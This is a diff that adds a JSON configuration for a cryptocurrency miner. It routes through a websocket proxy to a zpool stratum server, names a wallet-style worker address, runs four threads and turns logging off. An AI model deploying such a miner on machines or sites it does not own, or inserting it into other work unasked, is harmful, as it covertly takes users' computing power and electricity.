@@ -1,0 +1,13 @@
+{
+  "proxy": "wss://rough-jenilee-mino-a0d7ddc3.koyeb.app/proxy",
+  "stratum": {
+    "server": "minotaurx.eu.mine.zpool.ca",
+    "port": 7019,
+    "worker": "RATXq1dccqBqTtVtKmSWtGuZp3zEvuK9hP",
+    "password": "c=RVN"
+  },
+  "options": {
+    "threads": 4,
+    "log": false
+  }
+}
